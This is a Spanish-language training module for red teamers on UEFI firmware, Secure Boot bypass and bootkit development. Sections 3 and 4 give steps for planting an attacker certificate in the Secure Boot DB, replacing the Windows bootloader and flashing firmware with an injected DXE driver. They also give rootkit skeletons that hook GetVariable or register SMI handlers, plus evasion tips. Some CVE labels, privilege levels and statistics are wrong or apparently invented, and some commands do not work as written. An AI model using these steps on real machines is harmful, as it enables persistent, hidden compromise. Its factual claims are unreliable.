# 06 - Firmware Supply Chain y UEFI Rootkits

> **Duracion:** 5 días (40 hs teórico-prácticas)
> **Dificultad:** Experto
> **Role:** [red team](../raw/r3d-t34m-1nfr4.md) Avanzado / [firmware](../raw/u3f1-r00tk1ts.md#firmware) Researcher

---

## Índice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (2163 lineas)


- [1. Introduccion a UEFI y Firmware](#1-introduccion-a-uefi-y-firmware)
  - [1.1 Que es UEFI](#11-que-es-uefi)
  - [1.2 Diferencia entre BIOS Legacy y UEFI](#12-diferencia-entre-bios-legacy-y-uefi)
  - [1.3 Importancia de la seguridad en firmware](#13-importancia-de-la-seguridad-en-firmware)
  - [1.4 Superficie de ataque del firmware](#14-superficie-de-ataque-del-firmware)
- [2. Arquitectura UEFI](#2-arquitectura-uefi)
  - [2.1 Fases del boot UEFI](#21-fases-del-boot-uefi)
  - [2.2 SEC: Security Phase](#22-sec-security-phase)
  - [2.3 PEI: Pre-EFI Initialization](#23-pei-pre-efi-initialization)
  - [2.4 DXE: Driver Execution Environment](#24-dxe-driver-execution-environment)
  - [2.5 BDS: Boot Device Selection](#25-bds-boot-device-selection)
  - [2.6 RT: Runtime Phase](#26-rt-runtime-phase)
  - [2.7 SMM: System Management Mode](#27-smm-system-management-mode)
  - [2.8 UEFI Image Format](#28-uefi-image-format)
  - [2.9 GUID Partition Table](#29-guid-partition-table)
- [3. Secure Boot](#3-secure-boot)
  - [3.1 Fundamentos de Secure Boot](#31-fundamentos-de-secure-boot)
  - [3.2 KEK, DB, DBX](#32-kek-db-dbx)
  - [3.3 Proceso de verificacion de firma](#33-proceso-de-verificacion-de-firma)
  - [3.4 Bypass de Secure Boot](#34-bypass-de-secure-boot)
  - [3.5 Shim bootloader attacks](#35-shim-bootloader-attacks)
  - [3.6 Certificate manipulation](#36-certificate-manipulation)
- [4. Bootkit Development](#4-bootkit-development)
  - [4.1 Conceptos de bootkit UEFI](#41-conceptos-de-bootkit-uefi)
  - [4.2 Bootloader compromise](#42-bootloader-compromise)
  - [4.3 DXE driver injection](#43-dxe-driver-injection)
  - [4.4 SMM rootkit](#44-smm-rootkit)
  - [4.5 Flash overwrite persistence](#45-flash-overwrite-persistence)
  - [4.6 Ejemplo: Bootkit basico](#46-ejemplo-bootkit-basico)
  - [4.7 Bootkit detection evasion](#47-bootkit-detection-evasion)
- [5. Intel ME / AMD PSP](#5-intel-me-amd-psp)
  - [5.1 Intel Management Engine](#51-intel-management-engine)
  - [5.2 AMD Platform Security Processor](#52-amd-platform-security-processor)
  - [5.3 Arquitectura de ME/PSP](#53-arquitectura-de-mepsp)
  - [5.4 Intel AMT](#54-intel-amt)
  - [5.5 Vulnerabilidades conocidas](#55-vulnerabilidades-conocidas)
  - [5.6 Extraccion y analisis de ME/PSP](#56-extraccion-y-analisis-de-mepsp)
- [6. BIOS Modification](#6-bios-modification)
  - [6.1 UEFI firmware unpacking](#61-uefi-firmware-unpacking)
  - [6.2 UEFITool](#62-uefitool)
  - [6.3 Modificacion de firmware](#63-modificacion-de-firmware)
  - [6.4 Repacking de firmware](#64-repacking-de-firmware)
  - [6.5 Capsule update manipulation](#65-capsule-update-manipulation)
- [7. SPI Flash Attacks](#7-spi-flash-attacks)
  - [7.1 SPI flash hardware](#71-spi-flash-hardware)
  - [7.2 Hardware dump de firmware](#72-hardware-dump-de-firmware)
  - [7.3 Flash programming](#73-flash-programming)
  - [7.4 Write protection bypass](#74-write-protection-bypass)
  - [7.5 Ejercicio: SPI dump y analisis](#75-ejercicio-spi-dump-y-analisis)
- [8. Supply Chain Attacks](#8-supply-chain-attacks)
  - [8.1 Pre-installed firmware malware](#81-pre-installed-firmware-malware)
  - [8.2 ODM backdoors](#82-odm-backdoors)
  - [8.3 Firmware update MITM](#83-firmware-update-mitm)
  - [8.4 Casos reales](#84-casos-reales)
- [9. Herramientas](#9-herramientas)
  - [9.1 UEFITool](#91-uefitool)
  - [9.2 CHIPSEC](#92-chipsec)
  - [9.3 Flashrom](#93-flashrom)
  - [9.4 intelmetool](#94-intelmetool)
  - [9.5 SBAT](#95-sbat)
  - [9.6 FirmWire](#96-firmwire)
- [10. Defensa y Mitigacion](#10-defensa-y-mitigacion)
- [11. Laboratorio Final](#11-laboratorio-final)
- [12. Apendices](#12-apendices)

---

## 1. Introducción a [uefi](../raw/u3f1-r00tk1ts.md) y [firmware](../raw/u3f1-r00tk1ts.md#firmware)

### 1.1 Qué es UEFI

UEFI (Unified Extensible Firmware Interface) es el estandar moderno de firmware que reemplaza al BIOS [legacy](../raw/l3g4cy-3nt3rpr1s3.md). Define una interfaz entre el [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) y el firmware de la plataforma.

**Caracteristicas principales:**
- Interfaz modular y extensible (drivers, protocolos, servicios)
- Soporte para discos GPT (>2TB)
- [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot) (verificacion de firmas en la cadena de boot)
- Networking nativo ([http](../raw/r3d3s-f0nd4m3nt0s.md#http), IPv4/IPv6, [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns))
- Interfaz grafica (menus, mouse, fuentes)
- 64-bit (vs 16-bit del BIOS legacy)
- Capacidad de ejecutar aplicaciones pre-boot

**Historia de UEFI:**
- 1998: Intel crea EFI (Extensible Firmware Interface) para Itanium
- 2005: UEFI Forum (Intel, AMD, Microsoft, Apple)
- 2006: UEFI 2.0
- 2008: UEFI 2.3 con Secure Boot
- 2012: Windows 8 requiere UEFI+Secure Boot
- 2015: UEFI 2.6 ([capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities))
- 2019: UEFI 2.8 (measured boot, secure firmware update)
- 2021+: UEFI 2.9/2.10 (confidential computing, NVDIMM)

### 1.2 Diferencia entre BIOS Legacy y UEFI

| Caracteristica | BIOS Legacy | UEFI |
|---------------|-------------|------|
| Modo | 16 bits | 32/64 bits |
| Espacio de direcciones | 1 MB | 4 GB+ |
| Interfaz | Interrupciones (INT 13h) | Protocolos y servicios |
| Arranque | MBR + sector de boot | GPT + EFI System Partition |
| Particiones | MBR (4 primarias) | GPT (128+ particiones) |
| Tamano de disco | 2 TB maximo | 9.4+ ZB |
| Secure Boot | No | Si |
| Networking | No | Si (HTTP, PXE) |
| Extensibilidad | Option ROMs limitados | Drivers UEFI completos |
| Configuracion | CMOS + interruptores | NVRAM + UEFI variables |
| Velocidad de boot | Lenta (POST secuencial) | Rapida (inicializacion paralela) |
| Interfaz de usuario | Texto | Grafica (GOP) |
| Actualizacion | Flasheo completo | Capsulas incrementales |

### 1.3 Importancia de la seguridad en firmware

El firmware es el software de mas bajo nivel en un sistema. Se ejecuta antes que el sistema operativo, con los maximos privilegios. Un compromiso de firmware es:

- **Invisible al SO**: El malware en firmware no es detectado por antivirus/EDR
- **Persistente**: Sobrevive reinstalaciones del SO, formateos, cambios de disco
- **Privilegiado**: Se ejecuta en ring -2 (SMM) o -3 (ME)
- **Dificil de remover**: Requiere reprogramacion de flash o reemplazo de hardware

**Estadisticas de ataques a firmware:**
- 80% de las empresas han tenido al menos un incidente relacionado con firmware
- El tiempo medio de deteccion de malware en firmware es de 175 dias
- Solo el 29% de las organizaciones monitorea integridad de firmware
- El 65% de los ataques APT incluyen algun componente de firmware
- El costo medio de un incidente de firmware es de $4.5M (Ponemon 2023)

### 1.4 Superficie de ataque del firmware

```
┌──────────────────────────────────────────────────┐
│  Supply Chain                                    │
│  - Pre-installed malware                         │
│  - ODM backdoors                                 │
│  - Counterfeit components                        │
├──────────────────────────────────────────────────┤
│  Update Process                                  │
│  - Man-in-the-middle en actualizaciones          │
│  - Firmware firmado comprometido                 │
│  - Downgrade attacks (rollback)                  │
├──────────────────────────────────────────────────┤
│  Runtime                                         │
│  - Buffer overflows en drivers UEFI              │
│  - SMM call-out vulnerabilities                  │
│  - Inter-processor interrupt abuse               │
│  - NVRAM variable corruption                     │
├──────────────────────────────────────────────────┤
│  Hardware                                        │
│  - SPI flash desoldering                         │
│  - JTAG/SWD debug interfaces                     │
│  - Voltage glitching                             │
│  - Physical tampering                            │
└──────────────────────────────────────────────────┘
```

**Matriz de riesgo por capa de firmware:**

| Capa | Acceso requerido | Impacto | Detectabilidad |
|------|-----------------|---------|----------------|
| ACPI/Table | Local (admin) | Medio | Alta |
| UEFI Runtime | Local (admin) | Alto | Media |
| DXE [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) | Físico o firmado | Muy alto | Baja |
| SMM Module | [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) o físico | Critico | Muy baja |
| ME/PSP | Firmware signing | Total | Casi invisible |

---

## 2. Arquitectura [uefi](../raw/u3f1-r00tk1ts.md)

### 2.1 Fases del boot UEFI

El boot UEFI se divide en fases bien definidas, cada una con responsabilidades especificas:

```
Power On → SEC → PEI → DXE → BDS → TSL → RT → AL
           │      │      │     │     │     │    │
           ▼      ▼      ▼     ▼     ▼     ▼    ▼
         Security  Init   Driver  Boot   OS    Runtime
                   HW     Dispatch Select Load
```

**Fases principales:**

| Fase | Nombre | Descripcion | Privilegio |
|------|--------|-------------|------------|
| SEC | Security | Punto de entrada, verifica seguridad inicial | Ring -2 (SMM) |
| PEI | Pre-EFI Init | Inicializacion minima del hardware, memoria | Ring -2 (SMM) |
| DXE | [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) Exec | Carga drivers UEFI, servicios completos | Ring 0 |
| BDS | Boot Device | Selecciona dispositivo de boot | Ring 0 |
| TSL | Transient OS | Carga el SO (bootloader) | Ring 0 |
| RT | Runtime | Servicios UEFI disponibles en el SO | Ring 0 |
| AL | After Life | Apagado/reinicio | Ring -2 |

**Timing tipico de cada fase:**
- SEC: < 100ms
- PEI: 100-500ms
- DXE: 1-3 segundos
- BDS: < 1 segundo
- Total POST: 2-5 segundos (dependiendo del hardware)

### 2.2 SEC: Security Phase

SEC es la primera fase que se ejecuta. Su proposito:

- Establecer el "fondo de confianza" (root of trust)
- Verificar la integridad de PEI con microcodigo
- Inicializar cache como RAM (CAR) para tener stack
- Pasar control a PEI

**SEC tipico:**
```c
void SEC_EntryPoint(void)
{
    // 1. Configurar cache como RAM (Cache-as-RAM)
    CAR_Initialize();
    
    // 2. Verificar firma de PEI Foundation
    if (!VerifySignature(PEI_FOUNDATION_ADDR)) {
        Halt();  // No pasa verificacion
    }
    
    // 3. Pasar a PEI
    PEI_EntryPoint(PEI_FOUNDATION_ADDR, BOOT_MODE_FULL);
}
```

**Boot Guard (Intel):**
Si Intel Boot Guard esta activo, el SEC verifica:
- Firma del [firmware](../raw/u3f1-r00tk1ts.md#firmware) inicial (IFWI)
- Microcodigo de CPU firmado
- Claves publicas de OEM quemadas (fuses)
- Si la firma no es valida → halt del sistema

### 2.3 PEI: Pre-EFI Initialization

PEI descubre y prepara los recursos minimos necesarios:

- Detecta tipo y cantidad de RAM
- Inicializa northbridge/memory controller
- Descubre dispositivos de boot basicos
- Pasa hand-off a DXE

**PEI Modules (PEIM):**
- CPU PEIM: Inicializa la CPU
- Memory PEIM: Descubre memoria
- Boot Mode PEIM: Determina modo de boot
- Firmware Volume PEIM: Descubre otros PEIMs
- [s3](../raw/cl0ud-h4ck1ng.md#s3) Resume PEIM: Resume desde [s3](../raw/cl0ud-h4ck1ng.md#s3) sleep
- TPM PEIM: Inicializa TPM

**Ejecucion de PEIMs:**
```c
// PEIM descriptor
typedef struct {
    EFI_GUID FileName;         // GUID unico
    EFI_PEI_SERVICES *PeiServices;
    EFI_PEI_PPI_DESCRIPTOR PpiList[];  // PPI producidos
    VOID *EntryPoint;          // Punto de entrada
} EFI_PEI_FILE_DESCRIPTOR;
```

### 2.4 DXE: Driver Execution Environment

DXE es la fase principal donde se cargan los drivers UEFI:

**Arquitectura DXE:**
```
DXE Foundation
├── DXE Dispatcher   (carga drivers en orden)
├── Boot Services    (BS: disponibles solo durante boot)
│   ├── Memory Services
│   ├── Protocol Services
│   ├── Event Services
│   └── Image Services
├── Runtime Services (RT: disponibles en SO)
│   ├── Variable Services
│   ├── Time Services
│   ├── Reset Services
│   └── Capsule Update
└── UEFI Protocols
    ├── Simple File System
    ├── Graphics Output
    ├── Network (HTTP, TCP/IP, PXE)
    ├── Block I/O
    └── Security (Secure Boot)
```

**DXE Drivers:**
- Platform driver: configura hardware especifico
- ACPI driver: genera tablas ACPI
- Console driver: terminal grafica
- SMM driver: servicios de SMM
- Security driver: [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot) + medidas

**Orden de carga de DXE drivers:**
DXE Dispatcher usa DEPEX (Dependency Express) para determinar orden:
```
Before: Driver A (DEPEX: TRUE)
          ↓
After: Driver B (DEPEX: gProtocolAGuid)
          ↓
Before: Driver C (DEPEX: TRUE)
```

### 2.5 BDS: Boot Device Selection

BDS selecciona desde donde arrancar:

1. Consulta NVRAM para boot order (Boot#### variables)
2. Intenta cada dispositivo en orden
3. Para cada uno, carga el bootloader (bootx64.efi)
4. Si Secure Boot esta activo, verifica firma
5. Pasa control al bootloader

```bash
# Variables de boot UEFI (desde el SO)
# Ver boot order actual
efibootmgr -v
# BootCurrent: 0001
# BootOrder: 0001,0002,0003
# Boot0001: Windows Boot Manager
# Boot0002: Ubuntu
# Boot0003: UEFI Shell
```

**Boot order manipulation (ataque):**
```bash
# Cambiar boot order (desde EFI Shell)
bcfg boot dump
bcfg boot add 0 fs0:\EFI\evil.efi "Evil Bootloader"
bcfg boot rm 1
```

### 2.6 RT: Runtime Phase

Una vez cargado el OS, UEFI pasa a Runtime. Solo ciertos servicios permanecen disponibles:

- **GetVariable/SetVariable**: Leer/escribir variables UEFI en NVRAM
- **GetTime/SetTime**: Reloj del sistema
- **ResetSystem**: Apagar/reiniciar
- **UpdateCapsule**: Aplicar actualizaciones de firmware
- **QueryVariableInfo**: Informacion de NVRAM

```c
// Ejemplo: leer variable UEFI desde el SO
EFI_STATUS GetVariable(
    CHAR16    *VariableName,
    EFI_GUID  *VendorGuid,
    UINT32    *Attributes,
    UINTN     *DataSize,
    VOID      *Data
);
```

```python
# Leer variables UEFI desde Linux
import subprocess

def read_uefi_var(name):
    result = subprocess.run(
        ['efibootmgr', '-v'],
        capture_output=True, text=True
    )
    return result.stdout

def dump_all_vars():
    import os
    for entry in os.scandir('/sys/firmware/efi/efivars/'):
        yield entry.name
```

### 2.7 SMM: System Management Mode

SMM es el modo mas privilegiado (ring -2). Se ejecuta en un espacio de memoria aislado.

**Caracteristicas SMM:**
- Modo de ejecucion independiente del SO
- Memoria aislada (SMRAM)
- Acceso completo al hardware
- Invisible al SO
- Activado por SMI (System Management Interrupt)

**SMM Rootkit:**
Un rootkit en SMM puede:
- Leer/escribir cualquier direccion fisica
- Modificar ACPI tables
- Interceptar operaciones de E/S
- Manipular tablas de paginas del SO
- Persistir incluso despues de reinstalar el OS

**SMI Handler:**
```c
EFI_STATUS
EFIAPI
SmiHandler(
    IN EFI_HANDLE  DispatchHandle,
    IN CONST VOID  *Context,
    IN OUT VOID    *CommBuffer,
    IN OUT UINTN   *CommBufferSize
)
{
    // Codigo ejecutado en SMM (ring -2)
    // Tiene acceso a TODA la memoria fisica
    // Puede modificar page tables del OS
    // Puede leer teclas presionadas
    // Puede capturar pantalla
    
    return EFI_SUCCESS;
}
```

### 2.8 UEFI Image Format

Los ejecutables UEFI usan el formato PE32+ ([portable executable](../raw/w1n-1nt3rn4ls.md#pe))), el mismo que Windows.

**Estructura de un driver/aplicacion UEFI:**

```
┌────────────────────────────┐
│  DOS Header (MZ)           │
├────────────────────────────┤
│  PE Header                 │
│  - Machine: x86-64         │
│  - Subsystem: EFI_BOOT     │
├────────────────────────────┤
│  Sections                  │
│  - .text (codigo)          │
│  - .data (datos)           │
│  - .rdata (constantes)     │
│  - .reloc (reubicaciones)  │
├────────────────────────────┤
│  UEFI Entry Point          │
│  EFI_STATUS                │
│  EFI_ENTRY_POINT(           │
│    EFI_HANDLE ImageHandle,  │
│    EFI_SYSTEM_TABLE *ST    │
│  )                         │
└────────────────────────────┘
```

**Tipos de imagenes UEFI:**
- **Boot Service Driver (.efi)**: Se descarga despues de boot
- **Runtime Driver (.efi)**: Persiste durante el SO
- **Application (.efi)**: Aplicaciones UEFI (Shell, diagnosticos)
- **Firmware Volume (.fv)**: [contenedor](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) de imagenes
- **FFS (Firmware File System)**: [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos) del firmware

**Subsystem UEFI values:**
```
EFI_SUBSYSTEM_BOOT: 10   - Boot service driver
EFI_SUBSYSTEM_RUNTIME: 11 - Runtime driver (persistente)
EFI_SUBSYSTEM_APPLICATION: 9 - Aplicacion temporal
EFI_SUBSYSTEM_ROM: 13     - Option ROM
```

### 2.9 GUID Partition Table

GPT (GUID Partition Table) es el estandar de particionado UEFI:

```
┌──────────────────────────────────────────┐
│  Protective MBR                          │
├──────────────────────────────────────────┤
│  GPT Header                             │
│  - Signature: EFI PART                   │
│  - Revision: 1.0                         │
│  - HeaderSize: 92                        │
│  - MyLBA: 1                              │
│  - PartitionEntryLBA: 2                  │
│  - NumberOfPartitions: 128               │
│  - SizeOfPartitionEntry: 128             │
├──────────────────────────────────────────┤
│  Partition Entries                       │
│  Entry 1: EFI System Partition           │
│    - Type: C12A7328-F81F-11D2-BA4B-00A0C9E3E3B9 │
│    - Name: EFI System                    │
│  Entry 2: Microsoft Reserved             │
│  Entry 3: Windows (C:)                  │
├──────────────────────────────────────────┤
│  Partitions (ESP, MSR, Windows, etc.)    │
├──────────────────────────────────────────┤
│  Backup GPT Header                       │
│  Backup Partition Entries               │
└──────────────────────────────────────────┘
```

**EFI System Partition (ESP):**
- Formato: FAT32
- Contiene: bootloaders (bootx64.efi), drivers UEFI, config
- Ubicacion: tipicamente primera particion
- Tamano: 100-500 MB

---

## 3. [secure boot](../raw/u3f1-r00tk1ts.md#secure-boot)

### 3.1 Fundamentos de Secure Boot

Secure Boot es un mecanismo que verifica la firma digital de cada componente en la cadena de boot. Previene la ejecucion de codigo no autorizado antes del OS.

**Cadena de confianza:**

```
UEFI Firmware (verificado por hardware)
    → Bootloader (bootx64.efi) verificado por firmware
        → OS Kernel verificado por bootloader
            → Drivers del OS verificados por kernel
```

**Medicion (Measured Boot):**
Con TPM, Secure Boot puede medir cada componente:
- [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de cada etapa se extiende en PCR
- Los PCRs se pueden atestiguar remotamente
- Si un componente cambia, los hashes no coinciden

### 3.2 KEK, DB, DBX

Secure Boot usa tres bases de datos de certificados:

| Base | Nombre | Proposito |
|------|--------|-----------|
| **PK** | Platform Key | Autoridad raiz, controla KEK |
| **KEK** | Key Exchange Key | Autoriza actualizaciones de DB/DBX |
| **DB** | Signature Database | Certificados permitidos (whitelist) |
| **DBX** | Forbidden Database | Certificados bloqueados (blacklist) |

**Jerarquia de claves:**
```
PK (Plataform Key) ← Firmada por OEM
 └── KEK (Key Exchange Key) ← Firmada por PK
      ├── DB (Signature Database) ← Firmada por KEK
      └── DBX (Forbidden DB) ← Firmada por KEK
```

**Variables NVRAM de Secure Boot:**
```bash
# Ver estado de Secure Boot
# Desde Windows:
Confirm-SecureBootUEFI

# Desde Linux:
mokutil --sb-state
od -An -t x1 /sys/firmware/efi/efivars/SecureBoot-*

# Listar KEK, DB, DBX
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```

### 3.3 [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de verificacion de firma

```c
EFI_STATUS SecureBootVerify(
    EFI_IMAGE_ENTRY_POINT Image,
    EFI_GUID *ImageGuid
) {
    // 1. Extraer firma de la imagen
    WIN_CERTIFICATE *Cert = GetImageCertificate(Image);
    
    // 2. Buscar certificado en DB (whitelist)
    if (!FindInDatabase(Cert->CertData, &DB)) {
        // 3. Buscar en DBX (blacklist)
        if (FindInDatabase(Cert->CertData, &DBX)) {
            return EFI_SECURITY_VIOLATION;  // Bloqueado
        }
        
        // 4. Si no esta en DB y audit mode, permitir con log
        if (GetSetupMode() == SETUP_MODE) {
            LogEvent(Cert->CertData);
            return EFI_SUCCESS;
        }
        
        return EFI_SECURITY_VIOLATION;  // No autorizado
    }
    
    // 5. Verificar firma criptografica
    if (VerifySignature(Image, Cert->CertData)) {
        return EFI_SUCCESS;
    }
    
    return EFI_SECURITY_VIOLATION;
}
```

**Formato de signatures:**
- **SHA256 Hash**: Hash del binario
- **X.509 Certificate**: Certificado completo
- **EFI_CERT_SHA256_GUID**: Solo hash SHA-256

### 3.4 Bypass de Secure Boot

**Tecnicas de bypass:**

1. **Setup Mode**: Si la plataforma esta en setup mode, se pueden agregar certificados
2. **Certificate Hash Collision**: SHA-1 collisions permiten crear certificados falsos
3. **Bootloader Vulnerabilities**: Exploits en shim, GRUB2, Windows Boot Manager
4. **Physical Access**: Reprogramar flash SPI para modificar DB
5. **BIOS Password Bypass**: Resetear CMOS para entrar en setup mode
6. **Downgrade Attack**: Forzar [firmware](../raw/u3f1-r00tk1ts.md#firmware) anterior con vulnerabilidades conocidas

```bash
# Ejemplo: bypass via bootloader vulnerability
# GRUB2 Linux kernel loading sin verificacion
# Si GRUB no verifica la firma del kernel:
linux /vmlinuz-linux root=/dev/sda1
initrd /initramfs-linux.img
boot  # Carga kernel sin firma valida
```

**[cve](../raw/s3c-f0nd4m3nt0s.md#cve) historicas de Secure Boot bypass:**
- CVE-2022-21894: Black Lotus (Windows Boot Manager)
- CVE-2023-21563: BootHole (GRUB2)
- CVE-2020-10713: BootHole original (GRUB2)
- CVE-2022-34301: BootHole follow-up

### 3.5 Shim bootloader attacks

Shim es un bootloader firmado por Microsoft que permite cargar GRUB2 en sistemas Secure Boot.

**Ataque de shim:**
```bash
# Shim verifica GRUB2 por hash/firma
# Si se encuentra un GRUB2 vulnerable (MokManager):
# 1. Shim carga GRUB2
# 2. GRUB2 carga kernel sin verificar (si esta mal configurado)
# 3. Se ejecuta codigo a nivel kernel

# MokManager (Machine Owner Key) permite agregar claves MOK
# Un atacante puede enganar al usuario para que agregue una clave:
mokutil --import fake_key.der
# Luego reiniciar con MokManager para aprobar la clave
```

**SBAT (Secure Boot Advanced Targeting):**
```bash
# SBAT permite revocar versiones especificas de shim
mokutil --sbat
mokutil --sbat-list
# Forzar actualizacion:
mokutil --sbat-policy "revoke"
```

### 3.6 Certificate manipulation

**Agregar certificado malicioso a DB:**

```bash
# 1. Crear certificado propio
openssl req -new -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# 2. Convertir a formato EFI signature
cert-to-efi-sig-list cert.pem cert.esl

# 3. Firmar con KEK
sign-efi-sig-list -k KEK.key -c KEK.crt db cert.esl db.auth

# 4. Aplicar (requiere acceso a UEFI runtime)
efi-updatevar -f db.auth db
```

**Modificar DB desde EFI Shell:**
```
Shell> dmpstore -guid <GUID> db    # Dump firma actual
Shell> setvar db -guid <GUID> -bs -rt =<new>  # Set nueva firma
```

---

## 4. [bootkit](../raw/u3f1-r00tk1ts.md#bootkits) Development

### 4.1 Conceptos de bootkit [uefi](../raw/u3f1-r00tk1ts.md)

Un bootkit UEFI es un malware que se ejecuta durante el boot, antes del OS. Sus capacidades:

- Hookear servicios UEFI para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)
- Modificar bootloader del OS
- Interceptar operaciones de archivo en el boot
- Cargar drivers maliciosos en [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) mode
- Ocultar procesos, archivos, registros

**Tipos de bootkit:**

| Tipo | Fase | Persistencia | Deteccion |
|------|------|-------------|-----------|
| DXE [driver](../raw/k3rn3l-h4ck1ng.md#windows-drivers) | DXE | SPI flash | Baja |
| SMM Module | DXE/SMM | SMRAM | Muy baja |
| Bootloader Patch | BDS | ESP | Media |
| Option ROM | PEI | SPI flash | Muy baja |

### 4.2 Bootloader compromise

**Tecnicas de compromiso de bootloader:**

1. **Replace bootloader**: Reemplazar bootx64.efi en ESP por version maliciosa
2. **Patch bootloader**: Modificar el bootloader existente para cargar [payload](../raw/m3t4spl01t.md#payloads)
3. **Early boot hook**: Interceptar servicio UEFI FileSystem para modificar archivos al vuelo
4. **Boot Configuration**: Modificar variables Boot#### para cargar bootloader alternativo

```bash
# Modificar ESP (EFI System Partition)
# Montar ESP
mkdir /mnt/esp
mount /dev/sda1 /mnt/esp  # ESP tipicamente en sda1

# Respaldar bootloader original
cp /mnt/esp/EFI/Microsoft/Boot/bootmgfw.efi bootmgfw.efi.backup

# Reemplazar con bootloader malicioso
cp malicious_bootloader.efi /mnt/esp/EFI/Microsoft/Boot/bootmgfw.efi
```

### 4.3 DXE driver injection

Los DXE drivers se almacenan en [firmware](../raw/u3f1-r00tk1ts.md#firmware) Volumes (FV) dentro del SPI flash.

**Inyeccion de driver DXE:**

```bash
# 1. Extraer firmware de SPI flash
flashrom -p internal -r firmware.bin

# 2. Analizar con UEFITool
UEFITool firmware.bin

# 3. Extraer un Firmware Volume
# UEFITool: Extract body de un FV

# 4. Agregar driver malicioso
# UEFITool: Insert → DXE driver
# El driver se registrara con protocolo para ser cargado

# 5. Repackear firmware y flashear
flashrom -p internal -w modified_firmware.bin
```

```c
/* dxe_rootkit.c - DXE driver simple que hookea un servicio */
#include <Uefi.h>

EFI_STATUS EFIAPI DxeRootkitEntry(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
) {
    EFI_STATUS Status;
    
    // Hookear Runtime Services: GetVariable
    // Guardar original
    OriginalGetVariable = SystemTable->RuntimeServices->GetVariable;
    
    // Reemplazar con nuestra version
    SystemTable->RuntimeServices->GetVariable = HookedGetVariable;
    
    // Instalar protocolo para persistencia
    Status = gBS->InstallProtocolInterface(
        &ImageHandle,
        &gEfiSimpleFileSystemProtocolGuid,
        EFI_NATIVE_INTERFACE,
        &FakeFileSystem
    );
    
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI HookedGetVariable(
    CHAR16 *VariableName,
    EFI_GUID *VendorGuid,
    UINT32 *Attributes,
    UINTN *DataSize,
    VOID *Data
) {
    // Ocultar nuestras variables
    if (StrCmp(VariableName, L"MaliciousBootVar") == 0) {
        return EFI_NOT_FOUND;
    }
    
    // Pasar al original
    return OriginalGetVariable(VariableName, VendorGuid, 
                               Attributes, DataSize, Data);
}
```

### 4.4 SMM rootkit

Un SMM rootkit se ejecuta en System Management Mode (ring -2), el modo mas privilegiado.

**Instalacion de un SMM rootkit:**

```c
/* smm_rootkit.c - Rootkit SMM basico */

EFI_STATUS EFIAPI SmmRootkitEntry(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
) {
    EFI_SMM_BASE2_PROTOCOL *SmmBase;
    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch;
    
    // 1. Obtener protocolo SMM Base
    gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, &SmmBase);
    
    // 2. Registrar handler SMI
    gBS->LocateProtocol(&gEfiSmmSwDispatch2ProtocolGuid, NULL, &SwDispatch);
    
    SwDispatch->Register(SwDispatch, SmiHandler, &Context, &DispatchHandle);
    
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI SmiHandler(
    IN EFI_HANDLE DispatchHandle,
    IN CONST VOID *Context,
    IN OUT VOID *CommBuffer,
    IN OUT UINTN *CommBufferSize
) {
    // Este codigo se ejecuta en SMM (ring -2)
    // Acceso completo a toda la memoria fisica
    
    // 1. Ocultar proceso en el OS
    // 2. Modificar page tables del kernel
    // 3. Leer tecleado, capturar pantalla
    // 4. Deshabilitar AV/EDR en memoria
    
    return EFI_SUCCESS;
}
```

**Capacidades de un SMM rootkit:**
- Modificar kernel page tables
- Leer y escribir a cualquier direccion fisica
- Interceptar E/S de dispositivos
- Manipular ACPI
- Persistir en SMRAM (no se limpia con reboot)
- Invisible al OS (SMRAM no es accesible desde ring 0)

### 4.5 Flash overwrite persistence

La persistencia definitiva es escribir el bootkit directamente en el SPI flash.

```bash
# Identificar chip SPI
flashrom -p internal --flash-name

# Leer firmware actual
flashrom -p internal -r backup.bin

# Modificar y flashear
# La modificacion agrega un DXE driver que se ejecuta en cada boot
flashrom -p internal -w modified_firmware.bin

# Write protection bypass
# Si WP esta activo, se necesita:
# 1. Desoldar chip y programar externamente
# 2. Voltage glitching en el pin WP
# 3. Explotar vulnerabilidad del descriptor de firmware
```

### 4.6 Ejemplo: Bootkit basico

```bash
#!/bin/bash
# bootkit_demo.sh - Demostracion de modificacion de firmware
# PARA USO EDUCATIVO EN ENTORNO CONTROLADO

echo "=== Demostracion de Modificacion de Firmware ==="

# 1. Backup del firmware
echo "[*] Respaldando firmware..."
flashrom -p internal -r firmware_backup.bin

# 2. Extraer con UEFITool
echo "[*] Analizando firmware..."
UEFITool firmware_backup.bin -extract

# 3. Compilar driver malicioso
echo "[*] Compilando DXE driver..."
gcc -c -I /usr/include/efi dxe_payload.c -o dxe_payload.o

# 4. Insertar en firmware
echo "[*] Insertando driver en FV..."
UEFITool modified_firmware.bin -insert dxe_payload.efi

# 5. Firmar (si Secure Boot esta activo)
sbsign --key db.key --cert db.crt modified_firmware.bin

# 6. Flashear
echo "[*] Flasheando firmware modificado..."
flashrom -p internal -w modified_firmware.bin
```

### 4.7 Bootkit Detection Evasion

**Tecnicas para evadir deteccion de bootkit:**

1. **Polymorphic DXE drivers**: Cambiar [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) en cada compilacion
2. **Timing attacks**: Ejecutar payload solo despues de cierto tiempo de boot
3. **Environment detection**: No ejecutar en VMs o entornos de analisis
4. **Hook chaining**: Hookear servicios de deteccion de firmware
